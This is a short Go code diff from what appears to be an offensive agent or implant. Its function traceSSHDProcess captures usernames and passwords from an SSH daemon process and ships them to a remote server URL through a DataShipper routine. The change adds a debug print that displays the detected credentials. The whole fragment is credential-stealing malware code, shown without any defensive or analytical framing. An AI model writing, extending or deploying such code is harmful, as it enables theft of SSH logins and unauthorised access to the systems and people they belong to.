@@ -5,6 +5,7 @@ package agent_helper
 import (
 	"context"
 	"fmt"
+	"galleon/debug"
 	"os"
 	"regexp"
 	"runtime"
@@ -87,6 +88,9 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 								username := extractSSHUsername(pid)
 								if username == "unknown" {
 									username = firstValidCapture
+								}
+								if debug.Debug {
+									fmt.Printf("[!] Detected credentials from ssh: %v:%v\n", username, password)
 								}
 								go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
 								shipped = true
